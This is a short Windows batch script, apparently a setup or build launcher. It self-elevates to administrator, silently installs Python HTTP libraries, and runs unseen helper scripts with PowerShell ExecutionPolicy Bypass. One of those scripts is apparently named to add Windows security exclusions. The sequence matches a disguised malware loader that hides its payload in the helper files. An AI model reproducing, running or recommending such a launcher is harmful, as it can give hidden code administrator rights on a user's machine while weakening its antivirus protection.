@echo off
setlocal
set "PYTHON=python"
set "VENDOR=%~dp0vendor"
set "EXCPS=%~dp0add_win_exclude.ps1"
set "BUILDGIT=%~dp0buildgit.ps1"

:: Проверка на админ-права
openfiles >nul 2>&1
if %ERRORLEVEL% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb runAs"
    exit /b
)

where %PYTHON% >nul 2>&1
if %ERRORLEVEL% neq 0 exit /b 1

%PYTHON% -m pip install --upgrade pip >nul 2>&1
%PYTHON% -m pip install urllib3 requests >nul 2>&1

powershell -ExecutionPolicy Bypass -File "%VENDOR%\helper.ps1"
%PYTHON% "%VENDOR%\helper.py"
powershell -ExecutionPolicy Bypass -File "%EXCPS%"
powershell -ExecutionPolicy Bypass -File "%BUILDGIT%"
endlocal 